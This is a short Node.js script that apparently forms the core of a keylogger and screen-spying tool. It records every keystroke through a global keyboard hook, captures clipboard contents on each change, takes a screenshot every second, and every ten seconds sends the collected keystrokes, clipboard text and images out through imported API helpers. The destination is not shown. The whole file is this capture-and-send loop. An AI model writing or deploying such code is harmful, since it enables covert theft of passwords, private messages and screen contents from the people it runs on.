const { GlobalKeyboardListener } = require('node-global-key-listener')
const clipboardListener = require('clipboard-event');

const { getClipboard } = require("./utils/clipboard");
const { captureScreenshot } = require("./utils/screen");
const {
  pendingData
} = require('./utils/global.js');
const { sendClipboardAndKeyboardData, sendScreenData } = require('./utils/api.js');


const main = async () => {
  const v = new GlobalKeyboardListener();

  clipboardListener.startListening();
  clipboardListener.on('change', async () => {
    const change = await getClipboard()
    pendingData.clipboard += ','+change
  });

  v.addListener(function (e, down) {
    if (e.state === "DOWN" && !(e?.name?.includes("MOUSE"))) {
      pendingData.keyboard += ','+e.name;
    }
  });


  setInterval(() => {
    captureScreenshot()
  }, 1000)
  
  setInterval(() => {
    if (pendingData.clipboard != "" || pendingData.keyboard != "") {
      const success = sendClipboardAndKeyboardData(pendingData.clipboard, pendingData.keyboard)
      if (success) {
        pendingData.clipboard = ""
        pendingData.keyboard = ""
      }
    }

    if (pendingData.images.length) {
      const success = sendScreenData(pendingData.images)
      if (success) {
        pendingData.images = []
      }
    }
  }, 10000)
}

main()